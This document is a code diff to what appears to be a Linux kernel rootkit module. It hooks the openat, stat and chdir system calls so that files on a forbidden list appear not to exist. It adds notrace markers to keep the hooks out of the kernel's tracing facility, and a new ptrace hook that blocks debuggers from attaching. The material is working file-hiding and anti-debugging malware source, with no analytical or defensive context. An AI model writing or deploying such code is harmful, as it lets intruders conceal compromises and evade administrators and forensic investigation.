@@ -3,21 +3,23 @@
 LIST_HEAD(forbidden_files_list);
 spinlock_t forbidden_files_lock = __SPIN_LOCK_UNLOCKED(forbidden_files_lock);
 
-asmlinkage long (*__orig_openat)(const struct pt_regs *) = NULL;
-asmlinkage long (*__orig_newfstatat)(const struct pt_regs *) = NULL;
-asmlinkage long (*__orig_fstat)(const struct pt_regs *) = NULL;
-asmlinkage long (*__orig_lstat)(const struct pt_regs *) = NULL;
-asmlinkage long (*__orig_stat)(const struct pt_regs *) = NULL;
-asmlinkage long (*__orig_chdir)(const struct pt_regs *regs) = NULL;
+asmlinkage long (*__orig_openat)(const struct pt_regs *)        = NULL;
+asmlinkage long (*__orig_newfstatat)(const struct pt_regs *)    = NULL;
+asmlinkage long (*__orig_fstat)(const struct pt_regs *)         = NULL;
+asmlinkage long (*__orig_lstat)(const struct pt_regs *)         = NULL;
+asmlinkage long (*__orig_stat)(const struct pt_regs *)          = NULL;
+asmlinkage long (*__orig_chdir)(const struct pt_regs *regs)     = NULL;
+asmlinkage long (*__orig_ptrace)(const struct pt_regs *regs)    = NULL;
 
-asmlinkage long openat_hook(const struct pt_regs *regs) {
+
+asmlinkage long notrace openat_hook(const struct pt_regs *regs) {
     const char __user *u_path = (const char __user *)regs->si;
     if (path_is_forbidden(u_path))
         return -ENOENT;
     return __orig_openat(regs);
 }
 
-asmlinkage long stat_hook(const struct pt_regs *regs) {
+asmlinkage long notrace stat_hook(const struct pt_regs *regs) {
     const char __user *u_path = (const char __user *)regs->si;
     if (path_is_forbidden(u_path))
         return -ENOENT;
@@ -36,10 +38,24 @@ asmlinkage long stat_hook(const struct pt_regs *regs) {
     }
 }
 
-asmlinkage long chdir_hook(const struct pt_regs *regs)
+asmlinkage long notrace chdir_hook(const struct pt_regs *regs)
 {
     const char __user *u_path = (const char __user *)regs->di;
     if (path_is_forbidden(u_path))
         return -ENOENT;
     return __orig_chdir(regs);
+}
+
+asmlinkage void notrace ptrace_hook(struct pt_regs *regs) {
+    long request = regs->di;
+
+    // Check pid for special processes ? Don't know if this function is very useful...
+    // pid_t pid = regs->si;
+
+    if (request == PTRACE_ATTACH || request == PTRACE_TRACEME || request == PTRACE_DETACH) {
+        regs->ax = -EPERM;
+    }
+    else {
+        regs->ax = __orig_ptrace(regs);
+    }
 }
